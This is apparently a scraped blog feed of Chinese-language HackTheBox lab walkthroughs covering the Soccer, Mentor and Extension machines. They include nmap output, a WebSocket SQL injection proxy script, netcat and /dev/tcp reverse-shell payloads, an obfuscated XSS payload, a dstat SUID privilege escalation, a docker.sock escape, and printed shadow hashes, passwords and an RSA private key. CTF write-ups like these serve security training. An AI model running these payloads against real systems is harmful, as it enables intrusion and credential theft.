shadow12root:$y$j9T$ckehF3Y37zdTv6yQyHrbL1$3eyEH9Pq4Rq&#x2F;Pg8EX99DkT9UxvsxaNdw99TUEAuYEN1:19254:0:99999:7:::victor:$y$j9T$X5cO0WaSdvC8raJwnWISq1$yJkDJIDRqr2G.lT4UxnxP.qXFOql7awV88g5ugpJKI7:19231:0:99999:7::: 参考资料 XXE - XEE - XML External Entity - HackTrickshttps://book.hacktricks.xyz/pentesting-web/xxe-xee-xml-external-entity#html-entities synacktiv/php_filter_chain_generatorhttps://github.com/synacktiv/php_filter_chain_generator hxp CTF 2021 - The End Of LFI? - 跳跳糖https://tttang.com/archive/1395/ Fastcgi PHP-FPM Client &amp;&amp; Code Executionhttps://gist.github.com/phith0n/9615e2420f31048f7e30f3937356cf75 Prototype Pollution to RCE - HackTrickshttps://book.hacktricks.xyz/pentesting-web/deserialization/nodejs-proto-prototype-pollution/prototype-pollution-to-rce#exec-exploitation Pollution - HTB [Discussion] | BreachForumshttps://breached.vc/Thread-Pollution-HTB-Discussion HTB - Pollution [Hard] // MeowMeowAttack’s security.loghttps://meowmeowattack.github.io/htb/pollution/","categories":[],"tags":[{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://darkwing.moe/tags/HackTheBox/"}]},{"title":"Soccer - HackTheBox","slug":"Soccer-HackTheBox","date":"2022-12-19T07:24:17.000Z","updated":"2023-06-12T01:10:10.925Z","comments":true,"path":"2022/12/19/Soccer-HackTheBox/","link":"","permalink":"https://darkwing.moe/2022/12/19/Soccer-HackTheBox/","excerpt":"","text":"基本信息 https://www.hackthebox.com/home/machines/profile/519 10.10.11.194 端口扫描22和80: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108$ nmap -sC -sV -Pn 10.10.11.194Starting Nmap 7.93 ( https://nmap.org ) at 2022-12-19 13:26 CSTNmap scan report for 10.10.11.194Host is up (0.19s latency).Not shown: 997 closed tcp ports (conn-refused)PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)| ssh-hostkey:| 3072 ad0d84a3fdcc98a478fef94915dae16d (RSA)| 256 dfd6a39f68269dfc7c6a0c29e961f00c (ECDSA)|_ 256 5797565def793c2fcbdb35fff17c615c (ED25519)80/tcp open http nginx 1.18.0 (Ubuntu)|_http-server-header: nginx/1.18.0 (Ubuntu)|_http-title: Did not follow redirect to http://soccer.htb/9091/tcp open xmltec-xmlmail?| fingerprint-strings:| DNSStatusRequestTCP, DNSVersionBindReqTCP, Help, RPCCheck, SSLSessionReq, drda, informix:| HTTP/1.1 400 Bad Request| Connection: close| GetRequest:| HTTP/1.1 404 Not Found| Content-Security-Policy: default-src 'none'| X-Content-Type-Options: nosniff| Content-Type: text/html; charset=utf-8| Content-Length: 139| Date: Mon, 19 Dec 2022 05:27:30 GMT| Connection: close| &lt;!DOCTYPE html&gt;| &lt;html lang=\"en\"&gt;| &lt;head&gt;| &lt;meta charset=\"utf-8\"&gt;| &lt;title&gt;Error&lt;/title&gt;| &lt;/head&gt;| &lt;body&gt;| &lt;pre&gt;Cannot GET /&lt;/pre&gt;| &lt;/body&gt;| &lt;/html&gt;| HTTPOptions:| HTTP/1.1 404 Not Found| Content-Security-Policy: default-src 'none'| X-Content-Type-Options: nosniff| Content-Type: text/html; charset=utf-8| Content-Length: 143| Date: Mon, 19 Dec 2022 05:27:30 GMT| Connection: close| &lt;!DOCTYPE html&gt;| &lt;html lang=\"en\"&gt;| &lt;head&gt;| &lt;meta charset=\"utf-8\"&gt;| &lt;title&gt;Error&lt;/title&gt;| &lt;/head&gt;| &lt;body&gt;| &lt;pre&gt;Cannot OPTIONS /&lt;/pre&gt;| &lt;/body&gt;| &lt;/html&gt;| RTSPRequest:| HTTP/1.1 404 Not Found| Content-Security-Policy: default-src 'none'| X-Content-Type-Options: nosniff| Content-Type: text/html; charset=utf-8| Content-Length: 143| Date: Mon, 19 Dec 2022 05:27:31 GMT| Connection: close| &lt;!DOCTYPE html&gt;| &lt;html lang=\"en\"&gt;| &lt;head&gt;| &lt;meta charset=\"utf-8\"&gt;| &lt;title&gt;Error&lt;/title&gt;| &lt;/head&gt;| &lt;body&gt;| &lt;pre&gt;Cannot OPTIONS /&lt;/pre&gt;| &lt;/body&gt;|_ &lt;/html&gt;1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :SF-Port9091-TCP:V=7.93%I=7%D=12/19%Time=639FF63C%P=x86_64-apple-darwin21.5SF:.0%r(informix,2F,\"HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nConnection:\\x20SF:close\\r\\n\\r\\n\")%r(drda,2F,\"HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nConnecSF:tion:\\x20close\\r\\n\\r\\n\")%r(GetRequest,168,\"HTTP/1\\.1\\x20404\\x20Not\\x20FSF:ound\\r\\nContent-Security-Policy:\\x20default-src\\x20'none'\\r\\nX-Content-SF:Type-Options:\\x20nosniff\\r\\nContent-Type:\\x20text/html;\\x20charset=utf-SF:8\\r\\nContent-Length:\\x20139\\r\\nDate:\\x20Mon,\\x2019\\x20Dec\\x202022\\x2005SF::27:30\\x20GMT\\r\\nConnection:\\x20close\\r\\n\\r\\n&lt;!DOCTYPE\\x20html&gt;\\n&lt;html\\SF:x20lang=\\\"en\\\"&gt;\\n&lt;head&gt;\\n&lt;meta\\x20charset=\\\"utf-8\\\"&gt;\\n&lt;title&gt;Error&lt;/titSF:le&gt;\\n&lt;/head&gt;\\n&lt;body&gt;\\n&lt;pre&gt;Cannot\\x20GET\\x20/&lt;/pre&gt;\\n&lt;/body&gt;\\n&lt;/html&gt;\\nSF:\")%r(HTTPOptions,16C,\"HTTP/1\\.1\\x20404\\x20Not\\x20Found\\r\\nContent-SecurSF:ity-Policy:\\x20default-src\\x20'none'\\r\\nX-Content-Type-Options:\\x20nosnSF:iff\\r\\nContent-Type:\\x20text/html;\\x20charset=utf-8\\r\\nContent-Length:\\SF:x20143\\r\\nDate:\\x20Mon,\\x2019\\x20Dec\\x202022\\x2005:27:30\\x20GMT\\r\\nConnSF:ection:\\x20close\\r\\n\\r\\n&lt;!DOCTYPE\\x20html&gt;\\n&lt;html\\x20lang=\\\"en\\\"&gt;\\n&lt;heaSF:d&gt;\\n&lt;meta\\x20charset=\\\"utf-8\\\"&gt;\\n&lt;title&gt;Error&lt;/title&gt;\\n&lt;/head&gt;\\n&lt;body&gt;\\SF:n&lt;pre&gt;Cannot\\x20OPTIONS\\x20/&lt;/pre&gt;\\n&lt;/body&gt;\\n&lt;/html&gt;\\n\")%r(RTSPRequest,SF:16C,\"HTTP/1\\.1\\x20404\\x20Not\\x20Found\\r\\nContent-Security-Policy:\\x20deSF:fault-src\\x20'none'\\r\\nX-Content-Type-Options:\\x20nosniff\\r\\nContent-TySF:pe:\\x20text/html;\\x20charset=utf-8\\r\\nContent-Length:\\x20143\\r\\nDate:\\xSF:20Mon,\\x2019\\x20Dec\\x202022\\x2005:27:31\\x20GMT\\r\\nConnection:\\x20close\\SF:r\\n\\r\\n&lt;!DOCTYPE\\x20html&gt;\\n&lt;html\\x20lang=\\\"en\\\"&gt;\\n&lt;head&gt;\\n&lt;meta\\x20charSF:set=\\\"utf-8\\\"&gt;\\n&lt;title&gt;Error&lt;/title&gt;\\n&lt;/head&gt;\\n&lt;body&gt;\\n&lt;pre&gt;Cannot\\x20OSF:PTIONS\\x20/&lt;/pre&gt;\\n&lt;/body&gt;\\n&lt;/html&gt;\\n\")%r(RPCCheck,2F,\"HTTP/1\\.1\\x20400SF:\\x20Bad\\x20Request\\r\\nConnection:\\x20close\\r\\n\\r\\n\")%r(DNSVersionBindReSF:qTCP,2F,\"HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nConnection:\\x20close\\r\\nSF:\\r\\n\")%r(DNSStatusRequestTCP,2F,\"HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nSF:Connection:\\x20close\\r\\n\\r\\n\")%r(Help,2F,\"HTTP/1\\.1\\x20400\\x20Bad\\x20ReSF:quest\\r\\nConnection:\\x20close\\r\\n\\r\\n\")%r(SSLSessionReq,2F,\"HTTP/1\\.1\\xSF:20400\\x20Bad\\x20Request\\r\\nConnection:\\x20close\\r\\n\\r\\n\");Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 80.21 seconds 80需要加hosts： 110.10.11.194 soccer.htb 足球俱乐部： 目录扫描目录扫描发现tiny，是一个Tiny File Manager(字典要稍微大点)： 123gobuster dir -w ~/Tools/dict/SecLists/Discovery/Web-Content/raft-medium-directories.txt -t 50 -u http://soccer.htb//tiny (Status: 301) [Size: 178] [--&gt; http://soccer.htb/tiny/] Tiny File Manager默认账号密码登录： prasathmani/tinyfilemanager: Single-file PHP file manager, browser and manage your files efficiently and easily with tinyfilemanagerhttps://github.com/prasathmani/tinyfilemanager 1Default username&#x2F;password: admin&#x2F;admin@123 and user&#x2F;12345. webshell文件上传得到webshell，根目录不可写，uploads目录可写可执行： soc-player.htb查看nginx配置文件可以发现另一个vhost：soc-player.htb 12ls /etc/nginx/sites-available/cat /etc/nginx/sites-available/soc-player.htb 添加hosts后查看： 110.10.11.194 soccer.htb soc-player.soccer.htb 可以发现顶部多出login，signup等选项： websocket随意注册登录，有个ticket功能，测试发现是和9091端口交互的websocket请求： sql injection随意测试下，很明显的sql注入： 后面修改下搜到的脚本，sql注入获取数据： Automating Blind SQL injection over WebSocket | Rayhan0x01’s Bloghttps://rayhan0x01.github.io/ctf/2021/04/02/blind-sqli-over-websocket-automation.html 脚本基本上就是8081端口开个代理，接收到的数据转换下格式后通过websocket发到ws server，注入的时候提供一个有效的id参数，便于sqlmap识别结果,另外注册的账号会被自动删除导致sql注入到一半后失败，所以脚本里加了输出便于确认状态： 12345678python3 sql-exp.py[+] Starting MiddleWare Server[+] Send payloads in http://localhost:8081/?id=*sqlmap -u http://localhost:8081/\\?id\\=74913sqlmap -u http://localhost:8081/\\?id\\=74913 -D soccer_db -T accounts --dumpplayer ： PlayerOftheMatch2022 sql-exp.py123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960from http.server import SimpleHTTPRequestHandlerfrom socketserver import TCPServerfrom urllib.parse import unquote, urlparsefrom websocket import create_connectionws_server = \"ws://soc-player.soccer.htb:9091/\"def send_ws(payload): ws = create_connection(ws_server) # If the server returns a response on connect, use below line #resp = ws.recv() # If server returns something like a token on connect you can find and extract from here # For our case, format the payload in JSON message = unquote(payload).replace('\"','\\'') # replacing \" with ' to avoid breaking JSON structure data = '&#123;\"id\":\"%s\"&#125;' % message print(\"data: \"+ data) ws.send(data) resp = ws.recv() ws.close() if resp: return resp else: return ''def middleware_server(host_port,content_type=\"text/plain\"): class CustomHandler(SimpleHTTPRequestHandler): def do_GET(self) -&gt; None: self.send_response(200) try: payload = urlparse(self.path).query.split('=',1)[1] except IndexError: payload = False if payload: content = send_ws(payload) else: content = 'No parameters specified!' self.send_header(\"Content-type\", content_type) self.end_headers() self.wfile.write(content.encode()) print(content) return class _TCPServer(TCPServer): allow_reuse_address = True httpd = _TCPServer(host_port, CustomHandler) httpd.serve_forever()print(\"[+] Starting MiddleWare Server\")print(\"[+] Send payloads in http://localhost:8081/?id=*\")try: middleware_server(('0.0.0.0',8081))except KeyboardInterrupt: pass user flagsql注入得到的player账号密码ssh登录： 提权信息基础枚举，发现可以无密码以root身份doas运行dstat： 1234find / -perm -u=s -type f 2&gt;/dev/nullplayer@soccer:/tmp/miao$ cat /usr/local/etc/doas.confpermit nopass player as root cmd /usr/bin/dstat 根据文档，dstat可以用来监控和查看系统资源。并且它支持自定义插件。因此，我们可以创建一个恶意插件来执行我们的代码，然后以 root 权限运行 dstat dstat(1) - Linux man pagehttps://linux.die.net/man/1/dstat 所以我们可以通过自定义插件的方式来进行提权 提权 &amp; root flag确认dstat相关目录，制作恶意插件，执行： 12345678910111213find / -type d -name dstat 2&gt;/dev/null/usr/share/doc/dstat/usr/share/dstat/usr/local/share/dstatcd /usr/local/share/dstat/# 文件名需要dstst_*.pynano dstat_miao.py# 确认插件可以被检测到dstat --list | grep miao# 执行插件中的恶意命令：doas -u root /usr/bin/dstat --miao dstat_miao.py12import osos.system('chmod +s /usr/bin/bash') shadow12root:$6$1TJ9zs1GmR5XfWqC$sgVFNj7BvvbDDkfId&#x2F;gHPXk.HWTaENMFIScU.7afVhZiHob0kaQRtoiVgtOmcpZpgwEOLwWWw0Vjt&#x2F;IL4IJ990:19318:0:99999:7:::player:$6$LACsHEmcrExidOpg$vrXR4Ev7NYLkVEpk4qLfWsdF0XefyonoCnLqDHemJWooMJtcRC5jpsKy6MB.gU95PSva5I3Zjw5TwTR4J6GBf&#x2F;:19318:0:99999:7::: 参考资料 prasathmani/tinyfilemanager: Single-file PHP file manager, browser and manage your files efficiently and easily with tinyfilemanagerhttps://github.com/prasathmani/tinyfilemanager Automating Blind SQL injection over WebSocket | Rayhan0x01’s Bloghttps://rayhan0x01.github.io/ctf/2021/04/02/blind-sqli-over-websocket-automation.html dstat(1) - Linux man pagehttps://linux.die.net/man/1/dstat Soccer - HTB [Discussion] | BreachForumshttps://breached.vc/Thread-Soccer-HTB-Discussion--51427 HTB - Soccer [Easy] // MeowMeowAttack’s security.loghttps://meowmeowattack.github.io/htb/soccer/","categories":[],"tags":[{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://darkwing.moe/tags/HackTheBox/"}]},{"title":"Mentor - HackTheBox","slug":"Mentor-HackTheBox","date":"2022-12-11T14:41:23.000Z","updated":"2023-03-13T00:28:39.453Z","comments":true,"path":"2022/12/11/Mentor-HackTheBox/","link":"","permalink":"https://darkwing.moe/2022/12/11/Mentor-HackTheBox/","excerpt":"","text":"基本信息 https://www.hackthebox.com/home/machines/profile/518 10.10.11.193 端口扫描22和80: 1234567891011121314151617$ nmap -sC -sV -Pn 10.10.11.193Starting Nmap 7.93 ( https://nmap.org ) at 2022-12-11 21:08 CSTNmap scan report for 10.10.11.193Host is up (0.32s latency).Not shown: 998 closed tcp ports (conn-refused)PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3 (Ubuntu Linux; protocol 2.0)| ssh-hostkey:| 256 c73bfc3cf9ceee8b4818d5d1af8ec2bb (ECDSA)|_ 256 4440084c0ecbd4f18e7eeda85c68a4f7 (ED25519)80/tcp open http Apache httpd 2.4.52|_http-title: Did not follow redirect to http://mentorquotes.htb/|_http-server-header: Apache/2.4.52 (Ubuntu)Service Info: Host: mentorquotes.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 114.15 seconds 80需要加hosts： 110.10.11.193 mentorquotes.htb 一个博客： 子域名扫描子域名扫描可以发现api，一个小坑，匹配到的时候响应是404，大部分工具默认选项都会忽略这个结果： 123ffuf -w ~/Tools/dict/SecLists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u \"http://mentorquotes.htb/\" -H 'Host: FUZZ.mentorquotes.htb' -fc 302 -mc allapi [Status: 404, Size: 22, Words: 2, Lines: 1, Duration: 365ms] api.mentorquotes.htb同样加hosts后访问,默认结果404： 目录扫描对api进行目录扫描发现一些结果： 1234567gobuster dir -w ~/Tools/dict/SecLists/Discovery/Web-Content/common.txt -t 50 -u http://api.mentorquotes.htb//admin (Status: 307) [Size: 0] [--&gt; http://api.mentorquotes.htb/admin/]/docs (Status: 200) [Size: 969]/quotes (Status: 307) [Size: 0] [--&gt; http://api.mentorquotes.htb/quotes/]/server-status (Status: 403) [Size: 285]/users (Status: 307) [Size: 0] [--&gt; http://api.mentorquotes.htb/users/] docsdocs就是API文档,并且可以得到网站管理员的邮箱： 1james@mentorquotes.htb API根据文档调用API，注册登录，得到一个JWT： 使用得到的JWT调用其他API例如users，提示需要admin： jamesJWT验证逻辑问题，因为JWT中使用的是username而不是email，那使用我们自己的邮箱，但使用james的用户名注册登录得到的JWT就能够通过admin校验，发现svc用户： admin现在使用admin JWT访问admin，得到check和backup： backupcheck还没实现，backup需要有效的json post参数： 直接提交空json即可得到需要的参数： 构造有效参数，响应内容只有Done： 命令注入猜测backup实现方式，可以发现path参数的命令注入： docker root利用命令注入得到docker容器root： 1&#123;&quot;body&quot;:&quot;miao&quot;,&quot;path&quot;:&quot;&#x2F;etc&#x2F;passwd;rm &#x2F;tmp&#x2F;f;mkfifo &#x2F;tmp&#x2F;f;cat &#x2F;tmp&#x2F;f|sh -i 2&gt;&amp;1|nc 10.10.14.7 4444 &gt;&#x2F;tmp&#x2F;f;&quot;&#125; postgresqldb.py中可以得到数据库账号密码，转发端口，查看数据库得到几条hash： 123456789101112131415161718192021222324# localsudo ./chisel server --port 99999 --reverse# target./chisel client -v 10.10.14.7:9999 R:5432:172.22.0.1:5432# localpsql -h 10.10.14.7 -U \"postgres\" -p 5432postgres=# \\listmentorquotes_dbpostgrestemplate0template1postgres=# \\c mentorquotes_dbmentorquotes_db=# \\dmentorquotes_db=# select * from users;id | email | username | password ----+-------------------------+-------------+---------------------------------- 1 | james@mentorquotes.htb | james | 7ccdcd8c05b59add9c198d492b36a503 2 | svc@mentorquotes.htb | service_acc | 53f22d0dfa10dce7e29cd31f4f953fd8 4 | dedsec@mentorquotes.htb | james | fc8767a5e9e2382a17072b10725e1c8b(3 rows) svc的hash破解出来密码： 1123meunomeeivani user flagsvc用户ssh，得到user flag： 提权信息运行linpeas之类，发现snmp配置文件最近有更新： james查看snmp配置文件得到密码，这个密码就是james密码,james用户可以sudo执行sh： 123456cat /etc/snmp/snmpd.confcreateUser bootstrap MD5 SuperSecurePassword123__ DESsu jamessudo -l 提权 &amp; root flag shadow123root:$y$j9T$8yCyNLTeGfC2FDUDFE6sM1$e65o4d6wvakq5n8g3gyx.0R2UL1mAkx47MbbSvBE9a5:19292:0:99999:7:::svc:$y$j9T$4EcnvzyhSx1IAnV6cEyg.1$k1QRszqBOGsytZfsfKnslj9&#x2F;UTcGIsuEBXYpv7DMaE3:19306:0:99999:7:::james:$y$j9T$lIYLeondVze7GxH1PBwcb.$3ultsJbEkyEqFPlWzZyDoWTKC&#x2F;jZCx4Fy&#x2F;hLsyxkvH5:19154:0:99999:7::: 参考资料 Mentor - HTB [Discussion] | BreachForumshttps://breached.vc/Thread-Mentor-HTB-Discussion Hackthebox Mentor Writeup – 0xDedinfosechttps://0xdedinfosec.vercel.app/blog/hackthebox-mentor-writeup","categories":[],"tags":[{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://darkwing.moe/tags/HackTheBox/"}]},{"title":"Extension - HackTheBox","slug":"Extension-HackTheBox","date":"2022-12-04T08:34:02.000Z","updated":"2023-03-20T01:58:56.919Z","comments":true,"path":"2022/12/04/Extension-HackTheBox/","link":"","permalink":"https://darkwing.moe/2022/12/04/Extension-HackTheBox/","excerpt":"","text":"基本信息 https://www.hackthebox.com/home/machines/profile/482 10.10.11.171 端口扫描22和80: 123456789101112131415161718$ nmap -sC -sV -Pn 10.10.11.171Starting Nmap 7.93 ( https://nmap.org ) at 2022-12-04 14:17 CSTNmap scan report for 10.10.11.171Host is up (0.36s latency).Not shown: 998 closed tcp ports (conn-refused)PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)| ssh-hostkey:| 2048 8221e2a5824ddf3f99db3ed9b3265286 (RSA)| 256 913ab2922b637d91f1582b1b54f9703c (ECDSA)|_ 256 6520392ba73b33e5ed49a9acea01bd37 (ED25519)80/tcp open http nginx 1.14.0 (Ubuntu)|_http-server-header: nginx/1.14.0 (Ubuntu)|_http-title: snippet.htbService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 119.77 seconds 80snippet.htb,需要账号密码登录 子域名扫描添加hosts后扫描子域名，得到dev和mail： 12345610.10.11.171 snippet.htbffuf -w ~/Tools/dict/SecLists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u \"http://snippet.htb/\" -H 'Host: FUZZ.snippet.htb' -fl 30dev [Status: 200, Size: 12822, Words: 1029, Lines: 250, Duration: 328ms]mail [Status: 200, Size: 5311, Words: 364, Lines: 97, Duration: 354ms] dev一个gitea，注册账号登录后得到已有的几个有效用户名： mailRoundcube Webmail: API fuzz主站源码中提取出路由信息： 12345678910111213141516171819202122232425262728curl -s 10.10.11.171 | grep Ziggy | sed 's/ const Ziggy = //' | jq | grep uri | awk '&#123;print $2&#125;' | tr -d '\"\",'_ignition/health-check_ignition/execute-solution_ignition/share-report_ignition/scripts/&#123;script&#125;_ignition/styles/&#123;style&#125;dashboarduserssnippetssnippets/&#123;id&#125;snippets/update/&#123;id&#125;snippets/update/&#123;id&#125;snippets/delete/&#123;id&#125;newmanagement/validatemanagement/dumpregisterloginforgot-passwordforgot-passwordreset-password/&#123;token&#125;reset-passwordverify-emailverify-email/&#123;id&#125;/&#123;hash&#125;email/verification-notificationconfirm-passwordlogout management/dumpfuzz参数，fuzz值，得到users信息，profile是空的： 破解出几个有效账号密码： 12345gia@snippet.htbjuliana@snippet.htbletha@snippet.htbfredrick@snippet.htbef92b778bafe771e89245b89ecbc08a44a4e166c06659911881f383d4473e94f:password123 snippet任意一个有效账号密码登录，查看snippets，只有一个可以查看的，修改id发现存在API，现在无权限查看： 自己创建一个snippet，更新信息时只保留public为true(重要，别把内容也给改了，那就只能reset了)，修改id为2，可以越权修改其他snippet的设置，从而查看id为2的snippet： 123curl -XGET http:&#x2F;&#x2F;dev.snippet.htb&#x2F;api&#x2F;v1&#x2F;users&#x2F;jean&#x2F;tokens -H &#39;accept: application&#x2F;json&#39; -H &#39;authorization: basic amVhbjpFSG1mYXIxWTdwcEE5TzVUQUlYblluSnBB&#39;jean:EHmfar1Y7ppA9O5TAIXnYnJpA Giteajean是gitea那里的有效用户，可以登录dev的gitea,查看代码发现对issue的XSS过滤： str.replace 仅替换第一次出现的 &lt;&gt; 标签，因此我们可以使用两个 &lt;&gt; 标签来绕过它 查看设置可以发现charlie是合作者，所以可以通过issue xss去打charlie： xss所以就是通过XSS把我们当前的jean用户加入到charlie的合作者中, 在charlie的repo中得到backup： XSS-Payloads/Without-Parentheses.md at master · RenwaX23/XSS-Payloadshttps://github.com/RenwaX23/XSS-Payloads/blob/master/Without-Parentheses.md 1test&lt;test&gt;&lt;img SRC&#x3D;&quot;x&quot; onerror&#x3D;eval.call&#96;$&#123;&quot;eval\\x28atob&#96;dmFyIHU9J2h0dHA6Ly9kZXYuc25pcHBldC5odGIvY2hhcmxpZS9iYWNrdXBzL3NldHRpbmdzL2NvbGxhYm9yYXRpb24nO2ZldGNoKHUpLnRoZW4ociA9PiBkb2N1bWVudC5xdWVyeVNlbGVjdG9yKCdtZXRhW25hbWU9Il9jc3JmIl0nKS5jb250ZW50KS50aGVuKHQgPT4gZmV0Y2godSx7bWV0aG9kOidQT1NUJyxoZWFkZXJzOiB7J0NvbnRlbnQtVHlwZSc6J2FwcGxpY2F0aW9uL3gtd3d3LWZvcm0tdXJsZW5jb2RlZDsnfSwgYm9keTonY29sbGFib3JhdG9yPWplYW4mX2NzcmY9Jyt0fSkudGhlbihkID0+IGZldGNoKCdodHRwOi8vMTAuMTAuMTQuMTAvP2RvbmUnKSkp&#96;\\x29&quot;&#125;&#96;&gt; user flagbackup中得到charlie的ssh 私钥，登录，然后切换到jean用户，密码就是前面得到的，得到user flag： charlie_id_rsa123456789101112131415161718192021222324252627-----BEGIN RSA PRIVATE KEY-----MIIEpQIBAAKCAQEAx3BQ74w6hDrMrj5bxneqSvicR8WjTBF&#x2F;BEIWdzJpvWi+9onOufOUl0P+DE9YEv51HpOLqZ&#x2F;ZuSUxzMV&#x2F;Wf2Po4+aglepfGBx6GfuEm2mVH9x3T8pOZGWvs7qMMsh86ViyLwivMm0s&#x2F;NdW8I0NnKVmN9DVksJL5VO++Pc4GCkBHqQEU1pV5FeCUX&#x2F;ah8cllmGC&#x2F;W4op0aVM9MTlzD5YB1IOTpZgo8dG1yvVpySHWqBuG&#x2F;Hg4LA2&#x2F;lLn0OBU1nj52v4dpwuJ+7RgicgGgrJfj6roHEDsdQFs5uv0v7roYboKnknLo6Fiz2&#x2F;eQtTVb176+AhSdgs3UPqj9A7QgxV0GY6wIDAQABAoIBAQCh1N6n8rbM81WBEjKwUgvJ+AAAMTw3jn7tup62LB8nReam8N3hf+iT8eUkogGKsBXjMMCEbKRkGu1VBvE22YyDoRQ0LePme&#x2F;ASMLs7EuSD7kI70HOoNh4HSKk53Kr5JLuKvTbG0DmkR5b6zRRHFiWTvZ7LV+nlRZeox5ZEL8cHpejKB5wBdVJ&#x2F;UvHRs&#x2F;XvvZv86JFagbbfzrH6DJz4isE9SEFxcnWtKAnCz03CoP8mI0+5klIP359hkOKx1dYfSlc4zccZqU5y1UivtEtcEnvaPoARSuxA3hoN6wchnOvLbzFO2RN5vtxZ9YmztcelMOHLUrliun96sUgV33XkTjPpAoGBAPIo0UfIT4XXscKNkSp1VXai9E3noH1E2q6fIccAvmpOA3I2AW7ReEe1OD3beuArgL+RVF8oJOAD+UkWn8CP2bXnnT11a753WGUnPIr5Q9Mm1rZcrCD2EF5689eKSq49ecu2ISt3lyb4VMku1GXzQ3zaFELI8eSvTNXQjpLeAWBFAoGBANLWbQjQz81+dwud4grHGUCe2L9g0k&#x2F;KmnJ&#x2F;&#x2F;Q0+6iI9EGNmJLf5yHnYnqvIWWXSpOssQ3ZTJGWUHJ&#x2F;vDlrSpauZ6FJM9X4YLJ2DsSPFcxfcps+Y1oGE8o9Q7XHqyE4UrDiMH36CsRGPNwmwNMNHUb&#x2F;lkjELYKzSF58cTdA7Rp9vAoGBAOJL+qcWLhppoxioqwv+cktXpO5YksX93k5pL2uE6mz1UoscpOImpjx8wX4s6PssLDjZWvtBzJP7oq4GkmulAlLXiz2vyWxIozaEIDPPFO7x0JzCpah3ynxAcjbuaTPDB1qzbPPt4jbswm7vcFWFq3+1XFG87zBCEY+OQm5FQQvxAoGAfJZ3Mflqgm0T3cp7U5EZjAUR4e1N+haoM7cMCvK9mmPpNkOauRiibdYi1TH8Gd5i1BGA&#x2F;&#x2F;&#x2F;bhycBz0SNf&#x2F;&#x2F;wJDo7fb66ZrvUSXQTjibUfypFbHFNeJXeW&#x2F;Afj+yEVxeCOZwb1D9YcR7nEBOO6kJPvYzkWZT2mMlBaiVomf8dGYMCgYEA2Bqocj0mcncnt2m1F6Obp3ptv7zwF&#x2F;upk70lC6z3uo1xTSfnGPP&#x2F;MaX9vAmUF9XNwolFVzU6STMreBPRshW9RK+3tcx8Elxj4y+tMQCLHLvgyyYaGbp8iPU8FQCtjFpHKqxW0xdDDvfHUeUmiQRTZ1o3kJK6mr3QM89LJC&#x2F;l7gA&#x3D;-----END RSA PRIVATE KEY----- 提权信息运行pspy，得到mysql密码： 查看用户目录中的代码，发现可能存在命令注入： 因为是docker的mysql，靶机上没有mysql客户端，所以转发端口后查看信息： 1234ssh -i charlie_id_rsa charlie@10.10.11.171 -L 13306:127.0.0.1:3306use webapp;update users set user_type='Manager' where email='gia@snippet.htb'; 命令注入把我们已有的gia用户修改为管理员，网页上查看member查处的validate功能就是前面存在命令注入的功能点： 那直接创建一个恶意用户，利用命令注入得到容器 shell： 1insert into users(name,email) values(&#39;shell&#39;,&#39;shell@shell|| bash -c &quot;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;10.10.14.10&#x2F;4444 0&gt;&amp;1&quot; &amp;&#39;); docker 逃逸 &amp; root flag/app目录中存在docker.sock文件，常规docker逃逸： Exploit docker.sock to mount root filesystem in a containerhttps://gist.github.com/PwnPeter/3f0a678bf44902eae07486c9cc589c25 1234567curl -s --unix-socket /app/docker.sock http://localhost/images/json# outputlaravel-app_main:latestcmd=\"[\\\"/bin/sh\\\",\\\"-c\\\",\\\"chroot /tmp sh -c \\\\\\\"bash -c 'bash -i &amp;&gt;/dev/tcp/10.10.14.10/4444 0&lt;&amp;1'\\\\\\\"\\\"]\"curl -s -X POST --unix-socket /app/docker.sock -d \"&#123;\\\"Image\\\":\\\"laravel-app_main\\\",\\\"cmd\\\":$cmd,\\\"Binds\\\":[\\\"/:/tmp:rw\\\"]&#125;\" -H 'Content-Type: application/json' http://localhost/containers/create?name=miao_rootcurl -s -X POST --unix-socket /app/docker.sock \"http://localhost/containers/miao_root/start\" 得到root shell： shadow123root:$6$XJ0deONw$c1ag&#x2F;76NHYRVSxMwMeoYPUDsxZDdjC6sX5KKa.QUHi2mjIwN1NlLyRt3QS3E6JjPknuSSOyIUcTTq2SbIXZle&#x2F;:19157:0:99999:7:::jean:$6$2ct8z568$.FX4a9sSYGk0QxQiqfiMFIRu.oGdRvGcFgtOz3Hu9bV2i6&#x2F;Z.IpWlZxZn5iySUJuq9Rqw6oS8yTSFxbAZ4ede.:19156:0:99999:7:::charlie:$6$Ai.uOoSz$8QB.fXSM7pS2DDpUNBR3Xr3v3MUqlWdSmwEtOjOaRpH73UxGrcxJ&#x2F;hPkM7h.MfFHM2gzoyHL0.c7s&#x2F;glcc0Fu.:18995:0:99999:7::: root_id_rsa123456789101112131415161718192021222324252627-----BEGIN RSA PRIVATE 